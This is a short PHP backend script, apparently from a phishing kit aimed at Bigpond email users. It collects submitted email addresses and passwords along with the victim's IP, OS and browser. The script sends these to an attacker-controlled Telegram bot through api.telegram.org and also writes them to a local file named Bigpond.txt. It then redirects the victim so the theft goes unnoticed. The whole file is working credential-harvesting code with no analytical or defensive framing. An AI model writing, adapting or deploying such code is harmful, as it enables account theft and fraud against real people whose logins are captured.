<?php
include'./tginfo.php';
include'./agent.php';
$ip = getenv("REMOTE_ADDR");
$email = $_POST['usr'];
$password = $_POST['pwd'];
if (!empty($email) AND !empty($password)) {
	    $coronamsg .= "esdeath\n";
	    $coronamsg .= "\n📨 $email\n⌨️ $password\n\n🌍 $ip $user_os $user_browser\n";
	    $token = "$coronatoken";
        $data = ['text' => $coronamsg,'chat_id' => $coronachat,];
        file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data) );
        $file = fopen("../../Bigpond.txt","a");
        fwrite($file,"".$email.":".$password."\n");
        header("Location: ../home.php");
    }
else{
	    header('Location: ../index.php');
    } 

?>